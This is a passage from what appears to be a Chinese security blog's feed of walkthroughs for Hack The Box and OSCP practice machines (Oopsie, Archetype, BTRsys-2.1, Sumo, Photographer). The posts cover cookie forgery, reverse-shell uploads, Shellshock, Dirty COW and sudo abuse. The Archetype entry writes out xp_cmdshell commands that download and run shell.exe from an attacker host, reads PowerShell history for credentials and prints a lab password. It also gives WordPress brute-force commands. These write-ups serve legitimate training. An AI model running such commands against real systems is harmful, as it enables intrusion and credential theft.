--</span><br></pre></td></tr></table></figure><blockquote><p>这里的cmd_exec类似于SQL server的xp_cmdshell，可以执行系统命令</p><p>第一句是创建一个表cmd_exec，用来接收执行的命令，第二句是执行一段系统命令来建立反弹shell。</p></blockquote><p>经过尝试，这个shell 无回显，那再做一个反弹</p><p><img src="/img/Hackthebox-Vaccine/image-20240716182145562.png" alt="image-20240716182145562"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权至postgres"><a href="#1、提权至postgres" class="headerlink" title="1、提权至postgres"></a>1、提权至postgres</h3><p>1、信息收集</p><p>在www目录下找到数据库的账号密码</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183150203.png" alt="image-20240716183150203"></p><p>看是否有这个数据库名的用户</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183348914.png" alt="image-20240716183348914"></p><p>果然有，尝试ssh登陆</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183603564.png" alt="image-20240716183603564"></p><p>成功提权至postgres</p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p><img src="/img/Hackthebox-Vaccine/image-20240716183911838.png" alt="image-20240716183911838"></p><p>sudo 使用vi 编辑这个文件</p><p><img src="/img/Hackthebox-Vaccine/image-20240716184604359.png" alt="image-20240716184604359"></p><p>成功提权到root</p><p><img src="/img/Hackthebox-Vaccine/image-20240716184659521.png" alt="image-20240716184659521"></p>]]></content>
      
      
      <categories>
          
          <category> Hackthebox系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Hack The Box系列】Oopsie</title>
      <link href="/2024/07/16/Hackthebox-Oopsie/"/>
      <url>/2024/07/16/Hackthebox-Oopsie/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box系列—Oopsie"><a href="#Hack-The-Box系列—Oopsie" class="headerlink" title="Hack The Box系列—Oopsie"></a>Hack The Box系列—Oopsie</h1><p><img src="/img/Hackthebox-Oopsie/image-20240716150033322.png" alt="image-20240716150033322"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/Hackthebox-Oopsie/image-20240715172908789.png" alt="image-20240715172908789"></p><p>2、全端口扫描</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173042498.png" alt="image-20240715173042498"></p><p>3、漏洞扫描</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173553044.png" alt="image-20240715173553044"></p><h2 id="二、HTTP信息收集"><a href="#二、HTTP信息收集" class="headerlink" title="二、HTTP信息收集"></a>二、HTTP信息收集</h2><p><img src="/img/Hackthebox-Oopsie/image-20240715173614805.png" alt="image-20240715173614805"></p><p>1、http源代码查看</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173822857.png" alt="image-20240715173822857"></p><p>2、登陆页</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173942308.png" alt="image-20240715173942308"></p><h2 id="三、Getshell"><a href="#三、Getshell" class="headerlink" title="三、Getshell"></a>三、Getshell</h2><h3 id="1、越权"><a href="#1、越权" class="headerlink" title="1、越权"></a>1、越权</h3><p>尝试弱口令不行之后，通过游客身份进入，找到一个文件上传的地方，提示需要admin权限</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174144073.png" alt="image-20240715174144073"></p><p>回到账户信息这儿</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174246674.png" alt="image-20240715174246674"></p><p>对id 号进行遍历</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174821290.png" alt="image-20240715174821290"></p><p>发现管理员和超级管理员</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174942277.png" alt="image-20240715174942277"></p><p>当然是使用超级管理员的权限了；我们需要记住超级管理员的ID号和名字，之后伪造cookie</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175205817.png" alt="image-20240715175205817"></p><p>拦截Uploads 的请求页面进行cookie伪造</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175317794.png" alt="image-20240715175317794"></p><p>之后放包，出来上传页面</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175338382.png" alt="image-20240715175338382"></p><h3 id="2、文件上传getshell"><a href="#2、文件上传getshell" class="headerlink" title="2、文件上传getshell"></a>2、文件上传getshell</h3><p>把php反弹shell 的文件拿过来</p><img src="/img/Hackthebox-Oopsie/image-20240715175516377.png" alt="image-20240715175516377" style="zoom:150%;" /><p>更改成自己的IP和端口，之后用nc 进行监听</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175602005.png" alt="image-20240715175602005"></p><p>注意，上传过程中依然需要抓包改cookie</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175706601.png" alt="image-20240715175706601"></p><p>提示上传成功</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175734909.png" alt="image-20240715175734909"></p><p>那么文件上传的路径在哪儿，凭借感觉，总在某个upload 或 uploads 目录下</p><p><img src="/img/Hackthebox-Oopsie/image-20240715181616228.png" alt="image-20240715181616228"></p><p>成功获取shell</p><h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1、提权到robert"><a href="#1、提权到robert" class="headerlink" title="1、提权到robert"></a>1、提权到robert</h3><p>1、查找敏感文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715184012118.png" alt="image-20240715184012118"></p><p>发现数据库的账号密码</p><p><img src="/img/Hackthebox-Oopsie/image-20240715184138033.png" alt="image-20240715184138033"></p><p>登陆成功；没找到啥有用的信息，突然想到会不会数据库的密码就是用户的密码</p><p><img src="/img/Hackthebox-Oopsie/image-20240715184958853.png" alt="image-20240715184958853"></p><h3 id="2、提权到root"><a href="#2、提权到root" class="headerlink" title="2、提权到root"></a>2、提权到root</h3><p>1、查找suid 文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185258297.png" alt="image-20240715185258297"></p><p>2、尝试运行这个文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185433394.png" alt="image-20240715185433394"></p><p>3、利用这个文件可以越权查看文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185525361.png" alt="image-20240715185525361"></p><p>4、可以越权查看<code>/etc/shadow</code>之后爆破密码等</p>]]></content>
      
      
      <categories>
          
          <category> Hackthebox系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Hack The Box系列】Archetype</title>
      <link href="/2024/07/14/Hackthebox-Archetype/"/>
      <url>/2024/07/14/Hackthebox-Archetype/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box系列—Archetype"><a href="#Hack-The-Box系列—Archetype" class="headerlink" title="Hack The Box系列—Archetype"></a>Hack The Box系列—Archetype</h1><p><img src="/img/Hackthebox-Archetype/image-20240716150043365.png" alt="image-20240716150043365"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/Hackthebox-Archetype/image-20240714174834523.png" alt="image-20240714174834523"></p><p>2、漏洞探测</p><p><img src="/img/Hackthebox-Archetype/image-20240714181223120.png" alt="image-20240714181223120"></p><p>发现 Microsoft Windows 的 <code>CVE-2008-4250</code>远程代码执行漏洞</p><h2 id="二、SMB信息收集"><a href="#二、SMB信息收集" class="headerlink" title="二、SMB信息收集"></a>二、SMB信息收集</h2><p>空密码进行SMB登陆</p><p><img src="/img/Hackthebox-Archetype/image-20240714181443949.png" alt="image-20240714181443949"></p><p>进行SMB连接</p><p><img src="/img/Hackthebox-Archetype/image-20240714181735993.png" alt="image-20240714181735993"></p><p>似乎是sql 的账号密码</p><p><img src="/img/Hackthebox-Archetype/image-20240714181819976.png" alt="image-20240714181819976"></p><h2 id="三、MSSQL信息收集"><a href="#三、MSSQL信息收集" class="headerlink" title="三、MSSQL信息收集"></a>三、MSSQL信息收集</h2><p>1、连接mssql</p><p>使用impacket包的mssql客户端脚本连接mssql</p><p><img src="/img/Hackthebox-Archetype/image-20240714182506119.png" alt="image-20240714182506119"></p><p>查看数据库的权限</p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p><code>xp_cmdshell</code> 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 <code>sql servevr</code> 的原生工具，该扩展存储过程可用于催生Windows命令外壳；我们需要修改配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; </span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>之后执行命令，执行成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;net user&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714184901257.png" alt="image-20240714184901257"></p><p>我们利用msf 生成exe 进行上传和执行</p><p><img src="/img/Hackthebox-Archetype/image-20240714185333481.png" alt="image-20240714185333481"></p><p>通过mssql 下载到可下载的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.16.58:8000/shell.exe -outfile shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714185637204.png" alt="image-20240714185637204"></p><p>msf进行监听并执行shell.exe</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\shell.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714190034267.png" alt="image-20240714190034267"></p><p><img src="/img/Hackthebox-Archetype/image-20240714190112459.png" alt="image-20240714190112459"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>看下powershell 的历史命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714192414862.png" alt="image-20240714192414862"></p><p>看到admininstrator 的密码 <code>MEGACORP_4dm1n!!</code></p><p>使用psexec 进行登陆连接</p><blockquote><p>PsExec 是一种轻型 telnet-replacement，可用于在其他系统上执行进程，无需手动安装客户端软件即可完成控制台应用程序的完整交互性。 PsExec 最强大的用途包括在远程系统和远程启用工具（如 IpConfig）上启动交互式命令提示符。psexec的使用不需要对方主机开机3389端口，只需要对方开启admin共享或c(该共享默认开启，依赖于445端口)。但是，假如目标主机开启了防火墙(因为防火墙默认禁止445端口的连接)，psexec也是不能使用的，会提示找不到网络路径。由于psexec是windows提供的工具，所以杀毒软件会将其添加到白名单中。</p></blockquote><p><img src="/img/Hackthebox-Archetype/image-20240714193342548.png" alt="image-20240714193342548"></p>]]></content>
      
      
      <categories>
          
          <category> Hackthebox系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—BTRsys-2.1</title>
      <link href="/2024/07/14/OSCP-BTRsys-2-1/"/>
      <url>/2024/07/14/OSCP-BTRsys-2-1/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—BTRsys-2-1"><a href="#OSCP系列靶机—BTRsys-2-1" class="headerlink" title="OSCP系列靶机—BTRsys-2.1"></a>OSCP系列靶机—BTRsys-2.1</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-BTRsys-2-1/image-20240714120227641.png" alt="image-20240714120227641"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714120516228.png" alt="image-20240714120516228"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714121450552.png" alt="image-20240714121450552"></p><p>3、服务系统探测</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714121612617.png" alt="image-20240714121612617"></p><p>4、漏洞探测</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714122713884.png" alt="image-20240714122713884"></p><p>80端口扫到了一些目录，有wordpress框架和robots.txt 文件，以及易受DOS攻击</p><h2 id="三、ftp信息收集"><a href="#三、ftp信息收集" class="headerlink" title="三、ftp信息收集"></a>三、ftp信息收集</h2><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123426992.png" alt="image-20240714123426992"></p><p>输入<code>binary</code>进入二进制模式</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123541542.png" alt="image-20240714123541542"></p><p>啥也没有，肯定没这么容易；尝试文件上传</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123756178.png" alt="image-20240714123756178"></p><p>也失败了，暂时收集到这里</p><h2 id="四、HTTP信息收集"><a href="#四、HTTP信息收集" class="headerlink" title="四、HTTP信息收集"></a>四、HTTP信息收集</h2><p>1、首页</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123918510.png" alt="image-20240714123918510"></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714123931298.png" alt="image-20240714123931298"></p><p>2、目录扫描</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124456779.png" alt="image-20240714124456779"></p><p>3、wordpress信息收集</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124600748.png" alt="image-20240714124600748"></p><p>4、wpscan 扫描用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.69/wordpress/ --enumerate u </span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys-2-1/image-20240714124943626.png" alt="image-20240714124943626"></p><p>有<code>btrisk</code>和<code>admin</code>两个用户；<code>cewl </code>收集密码信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://192.168.31.69/wordpress/ -w pass.txt </span><br></pre></td></tr></table></figure><p>5、对收集的用户名进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url &quot;http://192.168.31.69/wordpress/&quot; -P &quot;pass.txt&quot; --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BTRsys-2-1/image-20240714125458846.png" alt="image-20240714125458846"></p><p>没有发现密码，使用其他的字典进行爆破</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714125935168.png" alt="image-20240714125935168"></p><p>找到admin 的密码admin</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714130018947.png" alt="image-20240714130018947"></p><p>登陆成功</p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>在后台对wordpress 的主题进行编辑</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132617563.png" alt="image-20240714132617563"></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132623180.png" alt="image-20240714132623180"></p><p>改成php反弹shell代码进行监听</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714132800786.png" alt="image-20240714132800786"></p><p>获取shell</p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><h3 id="1、提权到btrisk"><a href="#1、提权到btrisk" class="headerlink" title="1、提权到btrisk"></a>1、提权到btrisk</h3><p>1、信息收集</p><p>查看历史命令的时候发现了数据库root 的密码</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134159018.png" alt="image-20240714134159018"></p><p>2、数据库查看</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134324611.png" alt="image-20240714134324611"></p><p>对<code>wordpress</code>数据库进行查看</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134534395.png" alt="image-20240714134534395"></p><p>这个<code>btrisk</code>跟靶机中普通用户的名字一样，密码进行md5解密</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134656488.png" alt="image-20240714134656488"></p><p>ssh连接，提权到<code>btrisk</code></p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714134810020.png" alt="image-20240714134810020"></p><h3 id="2、提权到root"><a href="#2、提权到root" class="headerlink" title="2、提权到root"></a>2、提权到root</h3><p>sudo滥用提权</p><p><img src="/img/OSCP-BTRsys-2-1/image-20240714135143513.png" alt="image-20240714135143513"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Sumo</title>
      <link href="/2024/07/13/OSCP-Sumo/"/>
      <url>/2024/07/13/OSCP-Sumo/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Sumo"><a href="#【OSCP系列】OSCP靶机—Sumo" class="headerlink" title="【OSCP系列】OSCP靶机—Sumo"></a>【OSCP系列】OSCP靶机—Sumo</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Sumo/image-20240713200918079.png" alt="image-20240713200918079"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-Sumo/image-20240713201007493.png" alt="image-20240713201007493"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-Sumo/image-20240713201102130.png" alt="image-20240713201102130"></p><p>3、开放端口的服务信息</p><p><img src="/img/OSCP-Sumo/image-20240713201256990.png" alt="image-20240713201256990"></p><p>4、开放端口的漏洞信息</p><p><img src="/img/OSCP-Sumo/image-20240713201755990.png" alt="image-20240713201755990"></p><p>80端口受dos攻击影响</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>1、源代码查看</p><p><img src="/img/OSCP-Sumo/image-20240713201721364.png" alt="image-20240713201721364"></p><p><img src="/img/OSCP-Sumo/image-20240713201740102.png" alt="image-20240713201740102"></p><p>没啥信息</p><p>2、目录扫描</p><p><img src="/img/OSCP-Sumo/image-20240713201656130.png" alt="image-20240713201656130"></p><p>没结果，准备个大字典</p><p><img src="/img/OSCP-Sumo/image-20240713202824335.png" alt="image-20240713202824335"></p><p><img src="/img/OSCP-Sumo/image-20240713203549284.png" alt="image-20240713203549284"></p><p>大字典跑完了依然没结果</p><p>3、使用漏洞探测器</p><p>使用轻巧型扫描器 nikto 进行扫描，发现shellshock 漏洞</p><p><img src="/img/OSCP-Sumo/image-20240713203714112.png" alt="image-20240713203714112"></p><p>看下解释</p><p><img src="/img/OSCP-Sumo/image-20240713203841473.png" alt="image-20240713203841473"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>查找有关该漏洞的利用</p><p><img src="/img/OSCP-Sumo/image-20240713203945197.png" alt="image-20240713203945197"></p><p>有很多msf 内置的利用方式，去msf查找</p><p><img src="/img/OSCP-Sumo/image-20240713204214469.png" alt="image-20240713204214469"></p><p>确实有很多；在端口扫描中，发现80端口是apache服务，因此选择编号为1 的，更贴切apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.31.68</span><br><span class="line">set TARGETURI /cgi-bin/test.sh</span><br></pre></td></tr></table></figure><blockquote><p>这里rhosts 是靶机ip，TARGETURI 是nikto 识别出来的路径</p><p>lhost、lport 可以不用动，默认是本机IP跟端口，如果不是需要修改</p></blockquote><p><img src="/img/OSCP-Sumo/image-20240713205310315.png" alt="image-20240713205310315"></p><p>成功获取shell</p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>1、用户信息收集</p><p><img src="/img/OSCP-Sumo/image-20240713205441368.png" alt="image-20240713205441368"></p><p>只有一个<code>sumo</code>用户</p><p><img src="/img/OSCP-Sumo/image-20240713210829250.png" alt="image-20240713210829250"></p><p>啥也米有</p><p>2、高权限文件</p><p><img src="/img/OSCP-Sumo/image-20240713211017228.png" alt="image-20240713211017228"></p><p>啥也没有</p><p>3、脏牛提权</p><p>查看内核版本，版本较低，尝试脏牛提权</p><p><img src="/img/OSCP-Sumo/image-20240713211408827.png" alt="image-20240713211408827"></p><p>查找提权脚本</p><p><img src="/img/OSCP-Sumo/image-20240713212145891.png" alt="image-20240713212145891"></p><p>对该cpp文件在本地进行编译</p><p><img src="/img/OSCP-Sumo/image-20240713212454223.png" alt="image-20240713212454223"></p><p>通过python开启的http服务，上传到靶机</p><p><img src="/img/OSCP-Sumo/image-20240713212531447.png" alt="image-20240713212531447"></p><p>之后添加执行权限并执行</p><p><img src="/img/OSCP-Sumo/image-20240713212717174.png" alt="image-20240713212717174"></p><p>提权失败</p><p>4、脏牛提权其他姿势</p><p><img src="/img/OSCP-Sumo/image-20240713212805575.png" alt="image-20240713212805575"></p><p>查看编译语句</p><p><img src="/img/OSCP-Sumo/image-20240713212958765.png" alt="image-20240713212958765"></p><p>上传到靶机进行编译执行</p><p><img src="/img/OSCP-Sumo/image-20240713214237675.png" alt="image-20240713214237675"></p><p>用ssh连接提权到root</p><p><img src="/img/OSCP-Sumo/image-20240713214351227.png" alt="image-20240713214351227"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Photographer</title>
      <link href="/2024/07/01/OSCP-Photographer/"/>
      <url>/2024/07/01/OSCP-Photographer/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—Photographer"><a href="#【OSCP系列】OSCP靶机—Photographer" class="headerlink" title="【OSCP系列】OSCP靶机—Photographer"></a>【OSCP系列】OSCP靶机—Photographer</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Photographer/image-20240630231520178.png" alt="image-20240630231520178"></p><h2 id="二、端口发现"><a href="#二、端口发现" class="headerlink" title="二、端口发现"></a>二、端口发现</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-Photographer/image-20240630231559152.png" alt="image-20240630231559152"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Photographer/image-20240630231658308.png" alt="image-20240630231658308"></p><p><img src="/img/OSCP-Photographer/image-20240630231833186.png" alt="image-20240630231833186"></p><h3 id="3、服务版本探测"><a href="#3、服务版本探测" class="headerlink" title="3、服务版本探测"></a>3、服务版本探测</h3><p><img src="/img/OSCP-Photographer/image-20240630232036370.png" alt="image-20240630232036370"></p><p>80是HTTP服务，139、445是Samba服务，8000也是一个HTTP服务，推测服务器是Linux</p><h3 id="4、端口漏洞探测"><a href="#4、端口漏洞探测" class="headerlink" title="4、端口漏洞探测"></a>4、端口漏洞探测</h3><p><img src="/img/OSCP-Photographer/image-20240630232750568.png" alt="image-20240630232750568"></p><p><img src="/img/OSCP-Photographer/image-20240630233029884.png" alt="image-20240630233029884"></p><p><img src="/img/OSCP-Photographer/image-20240630233128877.png" alt="image-20240630233128877"></p><p>80端口发现了一个可能的SQL漏洞，还有一个csrf漏洞；8000端口发现了几个目录；针对windows 2000有一个smb的拒绝服务攻击</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><h3 id="1、80端口信息收集"><a href="#1、80端口信息收集" class="headerlink" title="1、80端口信息收集"></a>1、80端口信息收集</h3><p>虽然nmap在这个端口发现了一个sql漏洞，但是看那个链接都感觉不太行。还是正紧来吧，看首页</p><p><img src="/img/OSCP-Photographer/image-20240630233635378.png" alt="image-20240630233635378"></p><p>简单看了一下，都是静态页面，先转向8000端口</p><h3 id="2、8000端口信息收集"><a href="#2、8000端口信息收集" class="headerlink" title="2、8000端口信息收集"></a>2、8000端口信息收集</h3><p>这个页面有大大的问题啊</p><p><img src="/img/OSCP-Photographer/image-20240701002335801.png" alt="image-20240701002335801"></p><p>点那个<code>Download File</code>，居然显示了下面<code>shell.php</code>文件的报错信息</p><p><img src="/img/OSCP-Photographer/image-20240701004701807.png" alt="image-20240701004701807"></p><p>疑似某种连接未连接上，搜索这个网站的cms漏洞信息</p><p><img src="/img/OSCP-Photographer/image-20240701004955250.png" alt="image-20240701004955250"></p><p>存在任意文件上传；在这个脚本中也是给了操作的步骤</p><p><img src="/img/OSCP-Photographer/image-20240701005144564.png" alt="image-20240701005144564"></p><p>在第3步中进行上传，在给定的页面中没有找到上传点，只好目录爆破</p><p><img src="/img/OSCP-Photographer/image-20240701005632604.png" alt="image-20240701005632604"></p><p>存在<code>/admin</code>目录，是我们没有搜索的</p><p><img src="/img/OSCP-Photographer/image-20240701005852241.png" alt="image-20240701005852241"></p><p>是一个后台登陆页，这里也是一直没有登陆上，先暂时放弃这里</p><h2 id="四、SMB信息收集"><a href="#四、SMB信息收集" class="headerlink" title="四、SMB信息收集"></a>四、SMB信息收集</h2><p>之后我们将重点放在剩下的smb服务上</p><p><img src="/img/OSCP-Photographer/image-20240701010534865.png" alt="image-20240701010534865"></p><p>连接<code>sambashre</code></p><p><img src="/img/OSCP-Photographer/image-20240701010554998.png" alt="image-20240701010554998"></p><p>这里我只下载了<code>mailsent.txt</code>文件，剩下的那个<code>wordpress.bkp.zip</code>疑似是备份文件，但是文件太大了，暂时先不下载</p><p><img src="/img/OSCP-Photographer/image-20240701010652634.png" alt="image-20240701010652634"></p><p><code>mailsent.txt</code>文件是一份信，大致的内容是<code>agi@photographer.com</code>给<code>daisa@photographer.com</code>写的一份信，信的内容给了一个密码的提示，但是密码的内容呢？？？是<code>my babygirl ;)</code>其中的一部分吗？</p><p>这里没有文件包含，所以暂时不通过smb上传文件了</p><h2 id="五、Getshell"><a href="#五、Getshell" class="headerlink" title="五、Getshell"></a>五、Getshell</h2><p>通过smb拿到的用户名和密码，去8000登录页试一试。多次尝试之后<code>daisa@photographer.com/babygirl</code>是账号密码，登陆成功</p><p><img src="/img/OSCP-Photographer/image-20240701011553790.png" alt="image-20240701011553790"></p><p>同时，根据先前的提示，这里应该是任意文件上传的地方，抓包上传；根据提示，需要修改两处地方</p><p><img src="/img/OSCP-Photographer/image-20240701011810633.png" alt="image-20240701011810633"></p><p> 在首页会显示我们刚刚上传的文件</p><p><img src="/img/OSCP-Photographer/image-20240701011947837.png" alt="image-20240701011947837"></p><p>执行成功</p><p><img src="/img/OSCP-Photographer/image-20240701012009739.png" alt="image-20240701012009739"></p><p>利用python3进行反弹shell</p><p><img src="/img/OSCP-Photographer/image-20240701012453411.png" alt="image-20240701012453411"></p><p><img src="/img/OSCP-Photographer/image-20240701012510104.png" alt="image-20240701012510104"></p><h2 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h2><p>查找一下SUID文件</p><p><img src="/img/OSCP-Photographer/image-20240701012809586.png" alt="image-20240701012809586"></p><p><img src="/img/OSCP-Photographer/image-20240701012943821.png" alt="image-20240701012943821"></p><p>利用一句话直接提权</p><p><img src="/img/OSCP-Photographer/image-20240701013113227.png" alt="image-20240701013113227"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—Ha-natraj</title>
      <link href="/2024/06/30/OSCP-Ha-natraj/"/>
      <url>/2024/06/30/OSCP-Ha-natraj/</url>
      
